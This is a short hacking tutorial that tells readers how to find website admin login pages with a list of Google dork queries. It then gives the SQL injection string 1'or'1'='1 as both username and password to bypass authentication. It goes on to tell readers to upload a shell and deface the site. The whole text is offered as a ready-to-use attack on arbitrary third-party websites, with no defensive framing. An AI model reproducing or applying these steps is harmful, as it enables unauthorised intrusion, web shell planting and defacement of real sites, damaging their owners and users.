HACK WEBSITES ADMIN PANNEL USING BASIC SQL INJECTION

You might have seen hackers hacking and defaceing websites, editing it with their own stuff, makeing post on websites etc. There are many methods of doing this, In this tutorial I will be showing you a very basic and simply SQLi (Structured Query Language Injection). I will show you how to find the websites admin panel using a simple google dork and a SQL query to bypass the admin user name and password and enter into the panel. When you are in the panel just find a upload option and upload your shell, then deface it.

Dorks: inurl:adminlogin.aspx

inurl:admin/index.php

inurl:administrator.php

inurl:administrator.asp

inurl:login.asp

inurl:login.aspx

inurl:login.php

inurl:admin/index.php

inurl:adminlogin.aspx

# Try to make your own dorks also to get more success rate.​

Hundreds of sites will open up having /adminlogin.aspx in their URL. Select any website, you will get the area from where the admins login. Fill the details as:

User: 1'or'1'='1

Password: 1'or'1'='1

Use the above mentioned login details and you will be into the admin panel of a website. I will not work for all the websites you will find, but will work on most of the website.
